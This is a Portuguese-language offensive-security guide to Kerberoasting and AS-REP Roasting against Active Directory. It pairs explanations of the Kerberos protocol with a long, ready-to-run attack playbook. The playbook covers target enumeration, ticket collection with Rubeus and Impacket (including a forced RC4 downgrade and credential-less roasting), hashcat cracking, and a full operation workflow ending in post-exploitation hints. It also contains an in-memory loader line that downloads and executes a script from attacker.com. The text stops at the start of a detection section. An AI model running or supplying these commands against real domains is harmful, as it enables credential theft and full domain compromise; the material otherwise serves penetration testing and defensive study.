---
title: "Kerberoasting & AS-REP"
---

# Kerberoasting e AS-REP Roasting

# O que é?

Para entender Kerberoasting e AS-REP Roasting, é preciso compreender dois mecanismos específicos do protocolo Kerberos que essas técnicas exploram: SPNs (Service Principal Names) e a pré-autenticação Kerberos.

**Service Principal Names (SPNs) — o que são e por que existem:**

Um SPN é um identificador único de uma instância de serviço em um ambiente Active Directory. Ele segue um formato padronizado:

```
ServiceClass/Host:Port/ServiceName@REALM

Exemplos reais:
  MSSQLSvc/sql01.corp.local:1433@CORP.LOCAL   -> SQL Server instancia padrao
  HTTP/webapp.corp.local@CORP.LOCAL            -> IIS com Windows Auth
  CIFS/fileserver.corp.local@CORP.LOCAL        -> File sharing SMB
  TERMSRV/rdp.corp.local@CORP.LOCAL            -> Remote Desktop
  exchangeMDB/mail.corp.local@CORP.LOCAL       -> Microsoft Exchange
  RestrictedKrbHost/dc01.corp.local@CORP.LOCAL -> Host Kerberos restrito
```

SPNs existem porque o Kerberos precisa de um mecanismo para mapear "quero acessar o SQL Server em sql01" para "a chave criptografica que preciso usar e a da conta de servico svc_sql". Esse mapeamento e feito via SPN: quando um cliente solicita um TGS para `MSSQLSvc/sql01.corp.local:1433`, o KDC procura no AD qual objeto de conta possui esse SPN no atributo `servicePrincipalName`, obtém o hash NT desse objeto, e usa para cifrar o TGS.

SPNs são registrados no atributo `servicePrincipalName` de objetos de usuário ou computador no AD. Um DBA que instala o SQL Server registra o SPN `MSSQLSvc/hostname:1433` na conta de serviço do SQL (seja uma conta de usuário AD dedicada, seja a conta de computador). Contas de computador têm SPNs registrados automaticamente pelo AD (como `HOST/hostname`, `TERMSRV/hostname`). Contas de usuário recebem SPNs manualmente por administradores.

**O papel do SPN na emissão do TGS:**

O KDC não verifica se o solicitante do TGS tem autorização para acessar o serviço. Ele simplesmente:
1. Verifica se o TGT apresentado e valido (assinatura do krbtgt)
2. Busca o SPN solicitado no atributo `servicePrincipalName` do AD
3. Encontra a conta proprietaria daquele SPN
4. Obtém o hash NT dessa conta
5. Cifra o TGS com esse hash e o retorna

A verificacao de autorização ocorre apenas quando o serviço recebe o TGS (Fase 3 do protocolo). O KDC nao participa dessa decisao. Isso e o que torna Kerberoasting possivel: qualquer usuario autenticado pode solicitar TGS para qualquer SPN, e o KDC retorna o ticket cifrado com o hash da conta de servico sem questionar.

**Por que o TGS e criptografado com o hash da conta de servico (nao do usuario, nao da maquina):**

O serviço precisa conseguir decifrar o TGS apresentado pelo cliente para extrair a Session Key e o PAC. Para isso, o serviço precisa conhecer a chave. A unica chave que o servico conhece e a sua propria — derivada do hash NT da conta sob a qual ele roda. Por isso, o KDC cifra o TGS com o hash da conta de servico. E exatamente esse hash que o atacante quer quebrar: se o TGS esta cifrado com o hash de `svc_sql`, e o atacante tem o TGS, ele pode tentar todas as senhas possiveis ate encontrar a que gera o mesmo hash.

**Pré-autenticação Kerberos — o que é e por que existe:**

A pré-autenticacao e um mecanismo de segurança do Kerberos que exige que o cliente prove conhecimento da senha antes de receber o AS-REP. Sem pre-autenticacao, qualquer pessoa que conhecesse o nome de um usuario poderia solicitar o AS-REP desse usuario, receber o material cifrado com a senha do usuario, e tentar quebrar offline — sem nenhuma interacao adicional com o alvo.

Com pré-autenticacao habilitada (padrao), o cliente inclui no AS-REQ um campo `PA-ENC-TIMESTAMP`: um timestamp atual cifrado com o hash NT do usuario. O KDC so emite o TGT se conseguir decifrar esse timestamp corretamente e confirmar que é recente (dentro de 5 minutos). Isso obriga o solicitante a conhecer a senha real antes de obter qualquer material criptografico.

O campo que controla isso no Active Directory e o bit 22 do atributo `userAccountControl`, denominado `UF_DONT_REQUIRE_PREAUTH` (valor decimal 4194304). Quando esse bit esta setado em uma conta, o KDC emite o AS-REP sem pre-autenticacao — e a parte cifrada do AS-REP (que contem a session key cifrada com o hash NT do usuario) fica disponivel para qualquer solicitante.

**Quando DONT_REQUIRE_PREAUTH aparece em ambientes reais:**

- Sistemas legados que implementam clientes Kerberos antigos incapazes de executar pre-autenticacao
- Aplicacoes proprietarias escritas antes do RFC que mandatou pre-autenticacao
- Configuracao incorreta por administradores que depuravam problemas de autenticacao e esqueceram de reverter
- Integracao com sistemas Unix/Linux antigos usando MIT Kerberos sem suporte a PA-ENC-TIMESTAMP

# Onde é implementado?

**SPNs em ambientes corporativos reais:**

SPNs existem em qualquer ambiente Windows com Active Directory que usa servicos integrados ao dominio. Na pratica, isso significa praticamente todo ambiente corporativo medio e grande. As categorias mais comuns:

Servicos Microsoft nativos — registrados automaticamente:
- SQL Server registra `MSSQLSvc/hostname:1433` na conta de servico configurada durante instalacao
- IIS com Windows Authentication registra `HTTP/hostname` na conta do Application Pool
- Exchange registra multiplos SPNs (`exchangeMDB`, `exchangeAB`, `exchangeRFR`) na conta de servico
- DCs registram automaticamente `ldap`, `gc`, `host`, `RestrictedKrbHost` em suas contas de computador

Servicos de terceiros — registrados manualmente:
- Oracle Database (`OracleMTSRecoveryService/hostname`)
- SAP (`sap/hostname`)
- VMware vCenter (`HTTP/vcenter.domain.com`)
- Sistemas de backup (Veeam, NetBackup, etc.)
- Qualquer servico Windows customizado configurado para usar conta de dominio

**Contas de servico com SPNs — onde vivem:**

Em um ambiente corporativo tipico de 300+ usuarios, e comum encontrar entre 20 e 80 contas de servico com SPNs registrados. Muitas dessas contas:
- Foram criadas anos atras com senhas nunca rotacionadas
- Tem senhas configuradas manualmente por administradores (nao gMSA)
- Possuem privilegios elevados necessarios para os servicos que suportam
- Existem em grupos como Domain Admins por conveniencia historica ("o SQL precisava de DA para funcionar")

**Contas sem pre-autenticacao — onde aparecem:**

Contas com `DONT_REQUIRE_PREAUTH` sao encontradas principalmente em:
- Ambientes que migraram de Unix/Kerberos para AD sem revisar configuracoes legadas
- Dominios com servicos antigos que foram integrados ao AD sem hardening adequado
- Ambientes onde administradores desabilitaram pre-autenticacao para resolver problemas de autenticacao e nao restauraram
- Contas de usuarios regulares que foram configuradas incorretamente por helpdesk

**Por que e critico em ambientes reais:**

A combinacao de SPNs em contas com senhas fracas mais contas sem pre-autenticacao representa o cenario ideal para um atacante com apenas uma conta de dominio comprometida (ate mesmo uma conta de usuario comum, sem privilegios especiais). O impacto potencial vai de comprometimento de servicos individuais (Silver Ticket) ate comprometimento total do dominio se uma conta Kerberoastada for membro de Domain Admins.

# Como funciona de forma adequada?

**Fluxo TGS-REQ / TGS-REP legítimo com SPN:**

```
Alice quer acessar o SQL Server (MSSQLSvc/sql01.corp.local:1433)

    Alice                      KDC (TGS)                  SQL Server
      |                           |                           |
      |--- TGS-REQ -------------->|                           |
      |  padata: PA-TGS-REQ {     |                           |
      |    ap-req: {              |                           |
      |      ticket: <TGT>        |  TGT cifrado com krbtgt   |
      |      authenticator: {...} |  Autenticador c/ SessionK1|
      |    }                      |                           |
      |  }                        |                           |
      |  req-body: {              |                           |
      |    sname: MSSQLSvc/       |                           |
      |           sql01:1433      |  <- SPN solicitado        |
      |    etype: [AES256,RC4]    |                           |
      |  }                        |                           |
      |                           |                           |
      |                           | KDC processa:             |
      |                           | 1. Decifra TGT c/ krbtgt  |
      |                           | 2. Extrai SessionKey1     |
      |                           | 3. Decifra autenticador   |
      |                           | 4. Valida timestamp +-5min|
      |                           | 5. Busca SPN no AD:       |
      |                           |    WHERE servicePrincipal |
      |                           |    Name=MSSQLSvc/sql01:   |
      |                           |    1433                   |
      |                           | 6. Encontra: svc_sql      |
      |                           | 7. Pega hash NT de svc_sql|
      |                           | 8. Cifra TGS com hash     |
      |                           |    de svc_sql             |
      |                           |                           |
      |<-- TGS-REP ---------------|                           |
      |  ticket: TGS {            |                           |
      |    enc-part: {            |  <- cifrado com hash      |
      |      key: SessionKey2     |     NT de svc_sql         |
      |      cname: alice         |                           |
      |      PAC: [SIDs, grupos]  |                           |
      |    }                      |                           |
      |  }                        |                           |
      |  enc-part: {              |  <- cifrado com SessionK1 |
      |    key: SessionKey2       |     (Alice pode ler)      |
      |  }                        |                           |
      |                           |                           |
      |--- AP-REQ --------------->|-------------------------->|
      |  ticket: <TGS>            |          SQL Server:      |
      |  authenticator: {         |          1. Decifra TGS   |
      |    cifrado c/ SessionK2   |             com hash de   |
      |  }                        |             svc_sql       |
      |                           |          2. Extrai SessionK2
      |                           |          3. Le PAC e verifica
      |                           |             permissoes    |
      |                           |          4. Autentica Alice|
```

**Fluxo AS-REQ / AS-REP correto COM pre-autenticacao:**

```
    Alice                      KDC (AS)
      |                           |
      |--- AS-REQ --------------->|
      |  cname: alice             |
      |  sname: krbtgt/CORP.LOCAL |
      |  padata: PA-ENC-TIMESTAMP |
      |  {                        |
      |    patimestamp: <NOW>      |  <- timestamp atual, cifrado
      |    pausec: <microseg>      |     com hash NT de Alice
      |  }                        |
      |                           |
      |                           | KDC valida:
      |                           | 1. Alice existe no AD?
      |                           | 2. Decifra PA-ENC-TIMESTAMP
      |                           |    com hash NT de Alice
      |                           | 3. Timestamp dentro de +-5min?
      |                           | 4. Timestamp ja foi usado? (replay)
      |                           | -> Se tudo OK, emite TGT
      |                           |
      |<-- AS-REP ----------------|
      |  ticket: TGT {            |  <- cifrado com hash do krbtgt
      |    enc-part: {            |     Alice NAO consegue ler
      |      key: SessionKey1     |
      |      cname: alice         |
      |      PAC: [SIDs, grupos]  |
      |      endtime: +10h        |
      |      flags: RENEWABLE...  |
      |    }                      |
      |  }                        |
      |  enc-part: {              |  <- cifrado com hash NT de Alice
      |    key: SessionKey1       |     Alice CONSEGUE ler
      |    nonce: <echo>          |
      |  }                        |
```

**Como o SPN e validado no AD:**

O KDC executa uma busca LDAP no AD com filtro aproximado a:
```
(&(servicePrincipalName=MSSQLSvc/sql01.corp.local:1433)(objectClass=user))
```
Se encontrar exatamente um objeto com esse SPN, usa o hash NT desse objeto. Se nao encontrar, retorna `KRB5KDC_ERR_S_PRINCIPAL_UNKNOWN`. Se encontrar multiplos (configuracao incorreta), pode retornar erro ou usar o primeiro.

**Por que o ticket e cifrado com o hash da conta de servico — nao da maquina, nao do usuario:**

O servico precisa decifrar o TGS que chega nos AP-REQ. O servico so conhece sua propria chave (derivada do hash NT da conta sob a qual roda). O KDC conhece os hashes de todas as contas do AD. Portanto, o KDC usa o hash da conta de servico para cifrar o TGS — e so o servico correto consegue decifralo. Isso e o que possibilita o Kerberoasting: o TGS cifrado com o hash de `svc_sql` pode ser capturado e submetido a forca bruta offline, porque a chave que precisa ser descoberta e o hash NT de `svc_sql`, que e derivado da sua senha.

---

## A Mecânica do Roasting

### Kerberoasting — Mecânica Detalhada

O protocolo Kerberos funciona em três fases principais:

1. **AS-REQ / AS-REP**: O usuário solicita um Ticket Granting Ticket (TGT) ao Authentication Service. A resposta é criptografada com a chave derivada da senha do usuário.
2. **TGS-REQ / TGS-REP**: O usuário apresenta o TGT e solicita um TGS para um serviço específico (identificado pelo SPN). O KDC retorna o TGS criptografado com o hash NT do service account que possui aquele SPN.
3. **AP-REQ / AP-REP**: O usuário apresenta o TGS ao serviço. O serviço decripta usando sua própria chave.

O Kerberoasting explora a fase 2. O KDC não verifica se o usuário que solicita o TGS tem autorização para acessar o serviço — ele simplesmente retorna o ticket. A verificação de autorização ocorre apenas quando o serviço recebe o ticket (fase 3). Como o atacante nunca chega à fase 3, o serviço alvo nunca sabe que está sendo atacado.

**Algoritmos de criptografia e seu impacto**:
- **RC4-HMAC (etype 23)**: O ticket é criptografado com o hash NT diretamente como chave. Mais fácil de quebrar porque RC4 é criptograficamente mais fraco e o Hashcat processa hashes RC4-HMAC (`$krb5tgs$23`) muito mais rapidamente.
- **AES128-CTS-HMAC-SHA1-96 (etype 17)**: Mais forte. Hash Hashcat: `$krb5tgs$17`.
- **AES256-CTS-HMAC-SHA1-96 (etype 18)**: Ainda mais forte. Hash Hashcat: `$krb5tgs$18`.

Por padrão, se o serviço suporta RC4, o KDC retornará RC4. O atacante pode forçar downgrade para RC4 mesmo quando AES está disponível (técnica descrita na seção de comandos).

**O que é um SPN?**
Um Service Principal Name é o identificador único de uma instância de serviço no Active Directory. Exemplos:
- `MSSQLSvc/sql01.corp.local:1433` — SQL Server
- `HTTP/webapp01.corp.local` — IIS/Aplicação Web
- `HOST/server01.corp.local` — Host genérico
- `ldap/dc01.corp.local` — LDAP
- `TERMSRV/rdpserver.corp.local` — Terminal Services

Qualquer objeto de usuário ou computador no AD pode ter um SPN. SPNs em contas de usuário (não computadores) são os alvos prioritários do Kerberoasting, porque contas de computador possuem senhas longas e aleatórias de 120 caracteres geradas automaticamente — praticamente impossíveis de quebrar.

### AS-REP Roasting — Mecânica Detalhada

Em condições normais, o processo de autenticação Kerberos exige **pré-autenticação**: antes de receber o AS-REP, o cliente deve provar que conhece sua senha enviando um timestamp criptografado com o hash NT do usuário. Isso impede que atacantes solicitem AS-REPs para usuários arbitrários.

Quando a flag `DONT_REQUIRE_PREAUTH` (bit 22 do atributo `userAccountControl`, valor decimal 4194304) está configurada, o KDC ignora essa exigência e retorna o AS-REP diretamente. O AS-REP contém uma sessão de chave criptografada com o hash NT do usuário — e é isso que o atacante quebra offline.

**Por que essa flag existe?**
Alguns sistemas legados não suportam pré-autenticação Kerberos. Administradores às vezes habilitam essa flag para compatibilidade com aplicações antigas. Em alguns casos, é configurada por engano ou por desconhecimento das implicações de segurança.

**Cenário sem credenciais**:
Se o atacante possui apenas uma lista de usuários (obtida via OSINT, enumeração SMB anônima, etc.), pode usar ferramentas como Kerbrute para validar quais usuários existem no domínio e, em seguida, tentar AS-REP Roasting em todos eles. Aqueles com `DONT_REQUIRE_PREAUTH` retornarão material criptografável.

### Comparação Direta: Kerberoasting vs AS-REP Roasting

| Característica | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Ticket alvo | TGS (Ticket Granting Service) | AS-REP (Authentication Service Reply) |
| Alvo | Service accounts com SPN | Usuários com DONT_REQUIRE_PREAUTH |
| Requer autenticação? | Sim — precisa de uma conta de domínio | Não (com lista de usuários) |
| O que é quebrado? | Senha do service account | Senha do usuário |
| Evento gerado | 4769 (TGS Request) | 4768 (AS-REQ) |
| Formato de hash hashcat | `$krb5tgs$23$` | `$krb5asrep$23$` |
| Modo hashcat | 13100 (RC4), 19600-19700 (AES) | 18200 |
| Prevalência | Muito comum em ambientes AD | Menos comum, mas existe |

---

## Na Prática

### Fase 1: Reconhecimento — Encontrar Alvos

Antes de atacar, o objetivo é identificar as contas mais valiosas. Nem todos os alvos têm o mesmo valor.

**Prioridade para Kerberoasting**:
1. Service accounts membros de Domain Admins ou Enterprise Admins
2. Service accounts com acesso a sistemas críticos (SQL, Exchange, backup)
3. Service accounts com senhas antigas (passwordlastset há vários anos)
4. Contas com RC4 habilitado (mais fáceis de quebrar)

**Prioridade para AS-REP Roasting**:
1. Usuários administradores com a flag habilitada
2. Service accounts sem SPN mas com a flag (menos comum)
3. Qualquer conta ativa com a flag — mesmo usuários comuns

### Fase 2: Coleta de Hashes

A coleta é o passo que gera eventos no DC. Deve ser feita de forma eficiente — idealmente em uma única sessão com todos os alvos de alta prioridade.

### Fase 3: Quebra Offline

Após a coleta, toda a operação ocorre localmente na máquina do atacante. Não há mais interação com o domínio. Isso é o que torna o ataque tão poderoso do ponto de vista de OPSEC.

---

## Exemplos de Código / Comandos

### Enumeração de Alvos Kerberoastable

#### PowerView (Windows — requer importação do módulo)

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1
# Ou carregar em memória (evita escrita em disco):
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

# Listar todos os usuários com SPNs
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,memberof | Format-Table

# Filtrar apenas contas com alta probabilidade de sucesso (senha antiga)
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,memberof |
    Where-Object { $_.pwdlastset -lt (Get-Date).AddYears(-2) } |
    Sort-Object pwdlastset

# Verificar se algum service account é membro de grupos privilegiados
Get-DomainUser -SPN | ForEach-Object {
    $user = $_
    $groups = Get-DomainGroup -MemberIdentity $user.samaccountname
    if ($groups) {
        Write-Host "[!] $($user.samaccountname) é membro de: $($groups.name -join ', ')" -ForegroundColor Red
    }
}
```

#### Via LDAP direto (sem ferramentas adicionais — stealth)

```powershell
# Query LDAP nativa — funciona sem módulos externos
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset","memberof"))
$results = $searcher.FindAll()
foreach ($r in $results) {
    Write-Host "User: $($r.Properties['samaccountname'])"
    Write-Host "SPN: $($r.Properties['serviceprincipalname'])"
    Write-Host "PwdLastSet: $([DateTime]::FromFileTime($r.Properties['pwdlastset'][0]))"
    Write-Host "---"
}
```

#### Filtro LDAP para uso com ldapsearch (Linux)

```bash
# Com ldapsearch
ldapsearch -x -H ldap://DC_IP \
    -D "domain\user" \
    -w 'password' \
    -b "DC=domain,DC=com" \
    "(&(samAccountType=805306368)(servicePrincipalName=*))" \
    samaccountname serviceprincipalname pwdlastset memberof

# Alternativa com autenticação GSSAPI (ticket Kerberos)
ldapsearch -H ldap://DC_IP \
    -Y GSSAPI \
    -b "DC=domain,DC=com" \
    "(&(samAccountType=805306368)(servicePrincipalName=*))" \
    samaccountname serviceprincipalname
```

#### BloodHound — Queries para Kerberoasting

```cypher
-- No Raw Query do BloodHound:

-- Todos os usuários Kerberoastable ativos
MATCH (u:User {hasspn:true, enabled:true})
RETURN u.name, u.serviceprincipalnames, u.pwdlastset
ORDER BY u.pwdlastset ASC

-- Kerberoastable que são admins de algum computador
MATCH (u:User {hasspn:true, enabled:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

-- Kerberoastable com caminho para Domain Admins
MATCH p=shortestPath((u:User {hasspn:true, enabled:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}))
RETURN p LIMIT 10

-- Kerberoastable membros diretos de grupos privilegiados
MATCH (u:User {hasspn:true, enabled:true})-[:MemberOf]->(g:Group)
WHERE g.name CONTAINS "ADMIN" OR g.name CONTAINS "DOMAIN" OR g.name CONTAINS "ENTERPRISE"
RETURN u.name, g.name
```

---

### Executar Kerberoasting com Rubeus (Windows)

```powershell
# Ver estatísticas antes de atacar — quantos alvos, quais algoritmos
Rubeus.exe kerberoast /stats

# Output esperado:
# [*] Action: Kerberoasting Statistics
# Supported etype   RC4_HMAC_MD5 : 23
# Supported etype   AES256_CTS_HMAC_SHA1 : 18
# ...

# Kerberoast de todos os SPNs — salvar em arquivo
Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoast de usuário específico
Rubeus.exe kerberoast /user:svc_sql /outfile:hash_sql.txt /nowrap

# Kerberoast de vários usuários específicos
Rubeus.exe kerberoast /user:svc_sql,svc_backup,svc_exchange /outfile:hashes.txt /nowrap

# Forçar downgrade RC4 (etype 23) — muito mais rápido de crackear
# /tgtdeleg obtém TGT via S4U2Self para solicitar ticket RC4 mesmo que serviço prefira AES
# /rc4opsec filtra apenas contas que SÃO compatíveis com RC4 (reduz ruído)
Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes_rc4.txt

# Kerberoast com credenciais alternativas (PTH ou credenciais de outro usuário)
Rubeus.exe kerberoast /creduser:domain\user /credpassword:Password123 /outfile:hashes.txt

# Kerberoast via LDAP para um domínio específico (útil em ambientes multi-domínio)
Rubeus.exe kerberoast /domain:child.parent.com /dc:child-dc.child.parent.com /outfile:hashes.txt

# Ver somente estatísticas sem solicitar tickets (reconhecimento silencioso)
Rubeus.exe kerberoast /stats /domain:domain.com /dc:DC_IP
```

**Interpretando `/stats`**:
```
[*] Total kerberoastable users: 15
[*] RC4-HMAC (etype 23): 12 accounts
[*] AES256 (etype 18): 3 accounts
```
Isso indica 12 contas fáceis de quebrar (RC4) e 3 mais difíceis (AES256). Atacar as RC4 primeiro.

---

### Executar Kerberoasting com Impacket (Linux)

```bash
# Básico — com credenciais de texto plano
GetUserSPNs.py domain.com/usuario:senha -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Listar SPNs sem solicitar tickets (reconhecimento)
GetUserSPNs.py domain.com/usuario:senha -dc-ip 192.168.1.10

# Com hash NT (Pass-the-Hash)
GetUserSPNs.py domain.com/usuario -hashes :NTHASH -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Com ticket Kerberos
export KRB5CCNAME=/tmp/usuario.ccache
GetUserSPNs.py domain.com/usuario -k -no-pass -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Atacar SPN específico
GetUserSPNs.py domain.com/usuario:senha -dc-ip 192.168.1.10 \
    -request-user svc_sql \
    -outputfile hash_sql.txt

# Salvar em formato John the Ripper
GetUserSPNs.py domain.com/usuario:senha -dc-ip 192.168.1.10 \
    -request \
    -outputfile hashes_john.txt

# Especificar timeout (útil em redes lentas)
GetUserSPNs.py domain.com/usuario:senha -dc-ip 192.168.1.10 -request -timeout 30
```

---

### Formato dos Hashes Kerberoasting

```
# RC4-HMAC (etype 23) — modo 13100 no hashcat
$krb5tgs$23$*svc_sql$DOMAIN.COM$MSSQLSvc/sql01.domain.com:1433*$A1B2C3D4E5...longa_string_hex...$F6G7H8I9J0...

# AES128 (etype 17) — modo 19600 no hashcat
$krb5tgs$17$*svc_web$DOMAIN.COM$HTTP/webapp01.domain.com*$A1B2C3D4...

# AES256 (etype 18) — modo 19700 no hashcat
$krb5tgs$18$*svc_backup$DOMAIN.COM$BackupSvc/backupserver.domain.com*$A1B2C3D4...

# O campo entre $*...*$ contém: usuário$DOMÍNIO$SPN
# O primeiro campo longo é o checksum, o segundo é o dado cifrado
```

---

### Quebrar Hashes Kerberoasting com Hashcat

```bash
# RC4-HMAC — modo 13100 (mais comum e mais rápido)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# RC4-HMAC com regras (aumenta significativamente a taxa de sucesso)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# RC4-HMAC com múltiplas wordlists
hashcat -m 13100 hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# AES128 — modo 19600
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# AES256 — modo 19700
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# AES256 com pre-auth — modo 19900 (variante menos comum)
hashcat -m 19900 hashes.txt /usr/share/wordlists/rockyou.txt

# Ataque combinado (combina palavras de duas wordlists)
hashcat -m 13100 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Ataque de máscara — útil quando se sabe o padrão da senha corporativa
# Exemplo: senha no padrão Empresa2023! → ?u?l?l?l?l?l?d?d?d?d?s
hashcat -m 13100 -a 3 hashes.txt "?u?l?l?l?l?l?d?d?d?d?s"

# Ver progresso de sessão salva
hashcat -m 13100 hashes.txt --session=kerberoast --restore

# Benchmark para calcular tempo estimado
hashcat -m 13100 -b
```

**Velocidade esperada (GPU moderna)**:
- RC4-HMAC: ~500 MH/s (NVIDIA RTX 3090) — quebrável em horas/dias com wordlists boas
- AES256: ~80 KH/s — muito mais lento, requer senhas fracas ou wordlists direcionadas

---

### Enumeração de Alvos AS-REP Roastable

#### PowerView

```powershell
# Usuários com DONT_REQUIRE_PREAUTH
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol,pwdlastset,memberof

# Verificar valor de userAccountControl manualmente
# 4194304 = DONT_REQUIRE_PREAUTH (bit 22)
Get-DomainUser -Properties samaccountname,useraccountcontrol |
    Where-Object { $_.useraccountcontrol -band 4194304 }
```

#### LDAP Nativo (sem módulos)

```powershell
# LDAP filter: userAccountControl com bit DONT_REQUIRE_PREAUTH (4194304)
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","useraccountcontrol","pwdlastset"))
$results = $searcher.FindAll()
foreach ($r in $results) {
    Write-Host "[!] AS-REP Roastable: $($r.Properties['samaccountname'])"
}
```

```bash
# ldapsearch (Linux)
ldapsearch -x -H ldap://DC_IP \
    -D "domain\user" \
    -w 'password' \
    -b "DC=domain,DC=com" \
    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
    samaccountname useraccountcontrol

# O OID 1.2.840.113556.1.4.803 é o operador de bitwise AND do Active Directory
```

#### BloodHound Query

```cypher
-- Usuários AS-REP Roastable ativos
MATCH (u:User {dontreqpreauth: true, enabled: true})
RETURN u.name, u.pwdlastset
ORDER BY u.pwdlastset ASC

-- AS-REP Roastable com memberships em grupos privilegiados
MATCH (u:User {dontreqpreauth: true, enabled: true})-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
RETURN u.name, g.name
```

---

### Executar AS-REP Roasting SEM Credenciais

```bash
# Passo 1: Validar usuários existentes com Kerbrute
# (Kerbrute envia AS-REQ e observa a resposta para inferir se o usuário existe)
kerbrute userenum \
    --dc 192.168.1.10 \
    -d domain.com \
    /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
    -o valid_users.txt \
    --safe  # Para se detectar lockout policy

# Passo 2: AS-REP Roast de todos os usuários válidos sem credenciais
GetNPUsers.py domain.com/ \
    -usersfile valid_users.txt \
    -no-pass \
    -dc-ip 192.168.1.10 \
    -format hashcat \
    -outputfile asrep_hashes.txt

# Saída esperada:
# $krb5asrep$23$usuario1@DOMAIN.COM:A1B2C3D4...
# [-] usuario2 does not have UF_DONT_REQUIRE_PREAUTH set

# Formato John the Ripper ao invés de hashcat
GetNPUsers.py domain.com/ \
    -usersfile valid_users.txt \
    -no-pass \
    -dc-ip 192.168.1.10 \
    -format john \
    -outputfile asrep_hashes_john.txt
```

---

### Executar AS-REP Roasting COM Credenciais

```bash
# Impacket — com credenciais
GetNPUsers.py domain.com/usuario:senha \
    -dc-ip 192.168.1.10 \
    -request \
    -format hashcat \
    -outputfile asrep_hashes.txt

# Impacket — com hash NT
GetNPUsers.py domain.com/usuario \
    -hashes :NTHASH \
    -dc-ip 192.168.1.10 \
    -request \
    -format hashcat \
    -outputfile asrep_hashes.txt

# Impacket — listar sem solicitar hash (reconhecimento)
GetNPUsers.py domain.com/usuario:senha -dc-ip 192.168.1.10

# Usuário específico
GetNPUsers.py domain.com/ -users usuario_alvo -no-pass -dc-ip 192.168.1.10 -format hashcat
```

```powershell
# Rubeus — Windows
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Rubeus — usuário específico
Rubeus.exe asreproast /user:usuario_alvo /format:hashcat /outfile:asrep.txt /nowrap

# Rubeus — com credenciais de outro usuário
Rubeus.exe asreproast /creduser:domain\user /credpassword:Password123 /format:hashcat
```

---

### Formato dos Hashes AS-REP Roasting

```
# Formato hashcat — modo 18200
$krb5asrep$23$usuario@DOMAIN.COM:5ABCD1234...hash_longo...EFGH5678

# Estrutura:
# $krb5asrep$ = identificador
# 23 = RC4-HMAC (etype)
# $usuario@DOMAIN.COM = identidade
# : = separador
# 5ABC... = dados cifrados (contém a session key cifrada com o hash NT do usuário)
```

---

### Quebrar Hashes AS-REP com Hashcat

```bash
# AS-REP — modo 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Com regras
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule \
    -r /usr/share/hashcat/rules/d3ad0ne.rule

# Ataque de máscara (padrão corporativo)
hashcat -m 18200 -a 3 asrep_hashes.txt "?u?l?l?l?l?d?d?d?s"

# John the Ripper (alternativa)
john asrep_hashes_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Workflow Completo — Exemplo de Operação Real

```bash
# ===== FASE 1: RECONHECIMENTO (Linux/Impacket) =====

# Enumerar Kerberoastable
GetUserSPNs.py domain.com/user:pass -dc-ip 192.168.1.10 | tee spns.txt

# Enumerar AS-REP Roastable
GetNPUsers.py domain.com/user:pass -dc-ip 192.168.1.10 | tee asrep_candidates.txt

# ===== FASE 2: COLETA =====

# Kerberoast — prioritizar RC4
GetUserSPNs.py domain.com/user:pass -dc-ip 192.168.1.10 \
    -request -outputfile kerberoast_hashes.txt

# AS-REP Roast
GetNPUsers.py domain.com/user:pass -dc-ip 192.168.1.10 \
    -request -format hashcat -outputfile asrep_hashes.txt

# ===== FASE 3: CRACK (máquina local com GPU) =====

# Kerberoasting RC4
hashcat -m 13100 kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    /opt/wordlists/crackstation.txt \
    -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule \
    --force -o cracked_kerberoast.txt

# AS-REP Roasting
hashcat -m 18200 asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -o cracked_asrep.txt

# Ver resultados
hashcat -m 13100 kerberoast_hashes.txt --show
hashcat -m 18200 asrep_hashes.txt --show

# ===== FASE 4: PÓS-EXPLORAÇÃO =====
# Com a senha do service account quebrada:
# - Se for Domain Admin: DCSync, Golden Ticket
# - Se for admin de servidor: lateral movement
# - Usar como ponto de apoio para pivoting
```

---

## Detecção e OPSEC

### Eventos Windows Gerados

**Kerberoasting — Event ID 4769 (TGS Request)**:
```
Log: Security
Event ID: 4769
Account Name: usuario_comprometido
Service Name: svc_sql (nome do service account)
